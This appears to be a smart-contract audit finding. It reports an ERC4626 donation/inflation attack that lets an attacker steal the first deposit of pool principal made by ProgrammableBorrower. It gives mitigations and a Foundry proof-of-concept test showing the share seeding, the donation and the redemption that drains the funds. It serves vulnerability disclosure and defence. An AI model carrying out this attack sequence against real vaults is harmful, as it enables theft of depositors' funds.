### Title
Uninitialized ERC4626 vault donation lets depositor steal programmable-borrower principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` deposits idle pool principal into an arbitrary same-asset ERC4626 vault without checking the number or asset value of shares received. An unprivileged user of that vault can pre-seed one share and inflate `totalAssets()` with a direct asset donation before the first deposit, causing the borrower contract to receive zero or economically negligible shares while the attacker’s share claims nearly all deposited principal.

### Finding Description
The vault is configurable and is only checked for a nonzero address and matching `asset()` during initialization or `setVault`; there is no vault allowlist, minimum-liquidity requirement, or inflation-resistance requirement. [1](#0-0) [2](#0-1) 

During `onStartEpoch`, all idle underlying held by `ProgrammableBorrower` is deposited through `_depositToVault`. [3](#0-2)  `_depositToVault` calls `vault.deposit(_assetAmount, address(this))` but does not enforce `shares > 0`, a minimum share amount, or that `convertToAssets(shares)` approximately equals the deposited amount. [4](#0-3) 

For a vulnerable ERC4626 with total supply `S` and balance `B`, deposits mint `A * S / B` shares. When `S == 1` and the attacker previously donated `B > A`, the borrower receives zero shares while its `A` assets remain in the vault and are claimable by the attacker’s sole share. The borrower’s later valuation is derived from `vault.balanceOf(address(this))` and `vault.convertToAssets(shares)`, so a zero share balance becomes a principal loss rather than a recoverable position. [5](#0-4) 

The loss reaches the credit pool because `IdleCDOEpochVariant.startEpoch` first transfers pool funds to the borrower and then invokes `onStartEpoch` in the same transaction. [6](#0-5)  Vault losses are incorporated into the programmable-borrower accounting through `_vaultNetInterest` and `totalInterestDueNow`, but minted epoch interest cannot replace stolen principal; the backing represented by the CDO’s strategy-token balance is no longer recoverable. [7](#0-6) 

### Impact Explanation
On an empty or near-empty configured vault, an attacker can steal nearly the entire first programmable-borrower deposit. If the pool supplies `A` underlying and the attacker seeds the vault with one share plus a donation of `A + 1`, the borrower’s deposit mints `A / (A + 2) == 0` shares, while the attacker redeems one share for approximately `2A + 2` underlying.

This creates direct theft and pool insolvency rather than a mere pricing inaccuracy: the attacker withdraws the donated assets and the pool principal, while the CDO still carries strategy-token principal that cannot be recovered from the borrower contract. The same pattern can recur after an owner or manager honestly switches to another empty vault because `setVault` permits a new same-asset vault once the old share balance is zero. [8](#0-7) 

### Likelihood Explanation
Likelihood depends on the selected ERC4626 vault being empty or having negligible supply and not implementing virtual shares/assets or another donation-defense mechanism. The protocol itself does not constrain deployments to inflation-resistant vaults; `IdleCreditVaultFactory.deployRevolvingCreditVault` accepts the vault address as configuration and passes it directly to `ProgrammableBorrower.initialize`. [9](#0-8) [10](#0-9) 

No privileged actor is required for the exploit once an eligible vault is configured. An ordinary vault depositor and direct token sender can establish the inflated price before the first epoch deposit or before the first deposit following an honest vault migration.

### Recommendation
Treat ERC4626 deposits as value-risky external calls and validate their output:

- Require a nonzero result and a bounded slippage check, such as `vault.convertToAssets(shares) >= _assetAmount - tolerance`.
- Prefer `mint` with an exact share amount or a `deposit` wrapper that reverts when received shares fall below a computed minimum.
- Restrict integrations to audited ERC4626 vaults with virtual assets/shares or documented donation resistance.
- Seed new vault integrations before pool funds are exposed, and prevent operation while vault share supply or liquidity is below a safe threshold.
- Record share balance before and after deposit and reconcile both share count and converted asset value; share count alone is insufficient because an attacker can leave the borrower with economically negligible shares.

### Proof of Concept
The following Foundry PoC runs on a fork and uses a minimal ERC4626 implementation without inflation protection. The vulnerable code is the production deposit path, which accepts zero shares for the full pool deposit.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflatableERC4626 is ERC20 {
    IERC20 public immutable assetToken;

    constructor(address asset_) ERC20("Share", "SHARE") {
        assetToken = IERC20(asset_);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0
            ? shares
            : shares * assetToken.balanceOf(address(this)) / supply;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        uint256 supply = totalSupply();
        uint256 assetsBefore = assetToken.balanceOf(address(this));
        shares = supply == 0 || assetsBefore == 0
            ? assets
            : assets * supply / assetsBefore;

        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function decimals() public pure override returns (uint8) {
        return 18;
    }
}

contract MockCDO {
    address public token;
    constructor(address token_) {
        token = token_;
    }
}

contract ProgrammableBorrowerInflationPoC is Test {
    // Mainnet USDC; the exploit also works with any compatible asset.
    address internal constant USDC =
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function test_firstVaultDepositCanBeStolen() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        address attacker = makeAddr("attacker");
        address realBorrower = makeAddr("realBorrower");
        MockCDO cdo = new MockCDO(USDC);
        InflatableERC4626 vault = new InflatableERC4626(USDC);

        ProgrammableBorrower borrower = new ProgrammableBorrower();
        borrower.initialize(
            address(vault),
            address(cdo),
            address(this),
            address(this),
            realBorrower,
            0
        );

        uint256 poolAssets = 1_000_000e6;

        // Attacker creates the sole vault share and inflates its price.
        deal(USDC, attacker, poolAssets + 2);
        vm.startPrank(attacker);
        IERC20(USDC).approve(address(vault), 1);
        vault.deposit(1, attacker);
        IERC20(USDC).transfer(address(vault), poolAssets + 1);
        vm.stopPrank();

        // Simulates IdleCDOEpochVariant transferring pool funds and then calling
        // ProgrammableBorrower.onStartEpoch in the same transaction.
        deal(USDC, address(borrower), poolAssets);
        vm.prank(address(cdo));
        borrower.onStartEpoch(0);

        assertEq(vault.balanceOf(address(borrower)), 0);

        vm.prank(attacker);
        uint256 stolen = vault.redeem(1, attacker, attacker);

        // The attacker recovers the seed, donation, and all pool principal.
        assertEq(stolen, 2 * poolAssets + 2);
        assertEq(vault.convertToAssets(vault.balanceOf(address(borrower))), 0);
        assertEq(IERC20(USDC).balanceOf(address(borrower)), 0);
    }
}
```
